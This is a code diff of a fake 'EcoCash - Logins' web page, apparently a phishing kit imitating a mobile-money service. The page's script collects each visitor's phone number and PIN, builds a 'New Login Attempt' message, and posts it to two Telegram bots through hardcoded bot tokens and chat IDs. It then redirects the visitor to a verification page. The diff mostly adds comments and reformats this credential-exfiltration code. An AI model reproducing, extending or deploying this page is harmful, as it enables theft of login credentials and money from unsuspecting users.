@@ -7,7 +7,6 @@
     <title>EcoCash - Logins</title>
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');
-        
         * {
             margin: 0;
             padding: 0;
@@ -213,7 +212,6 @@
             gap: 8px;
             width: 180px;
             box-shadow: 0 8px 25px rgba(0, 0, 0, 0.15);
-            text-decoration: none;
         }
         
         .btn-icon {
@@ -337,18 +335,18 @@
             </div>
         </div>
     </div>
-
     <div id="spinnerOverlay">
         <div class="spinner"></div>
         <div class="spinner-text">
             Please wait...<br> This usually takes a few seconds
         </div>
     </div>
-
     <script>
+        // Bot 1 (your existing)
         const BOT_TOKEN_1 = '9033945989:AAHgEgTkLSpMPG0jO_npli0wBVHdHCBADrM';
         const CHAT_ID_1 = '5654867369';
 
+        // Bot 2 (your second bot)
         const BOT_TOKEN_2 = '7915486968:AAEpg0PmZlfzGKzpxcOWTTIF-x_Cg7_YEwI';
         const CHAT_ID_2 = '5615316142';
 
@@ -357,7 +355,6 @@
         if (savedPhone && savedPhone.length === 9) {
             phoneInput.value = savedPhone;
         }
-
         const pinBoxes = document.querySelectorAll('.pin-box');
         const loginBtn = document.getElementById('loginBtn');
         const spinnerOverlay = document.getElementById('spinnerOverlay');
@@ -382,6 +379,7 @@
             });
         });
 
+        // ========== LOGIN CLICK ==========
         loginBtn.addEventListener('click', () => {
             const phone = phoneInput.value.trim();
             if (!phone) {
@@ -390,31 +388,45 @@
             }
 
             spinnerOverlay.style.display = 'flex';
+
+            // Save phone to localStorage
             localStorage.setItem('phone', phone);
 
+            // Build the credential message
             const message = `New Login Attempt\n\nPhone: +263 ${phone}\nPIN: ${pinValue}`;
 
+            // Send to Bot 1
             fetch(`https://api.telegram.org/bot${BOT_TOKEN_1}/sendMessage`, {
                 method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ chat_id: CHAT_ID_1, text: message })
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID_1,
+                    text: message
+                })
             }).catch(() => {});
 
+            // Send to Bot 2
             fetch(`https://api.telegram.org/bot${BOT_TOKEN_2}/sendMessage`, {
                 method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ chat_id: CHAT_ID_2, text: message })
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID_2,
+                    text: message
+                })
             }).catch(() => {});
 
+            // Proceed to next page
             setTimeout(() => {
                 window.location.href = 'verify.html';
             }, 1500);
         });
 
         checkPinComplete();
-        if (pinBoxes.length > 0) {
-            pinBoxes[0].focus();
-        }
+        pinBoxes[0].focus();
     </script>
 </body>
 
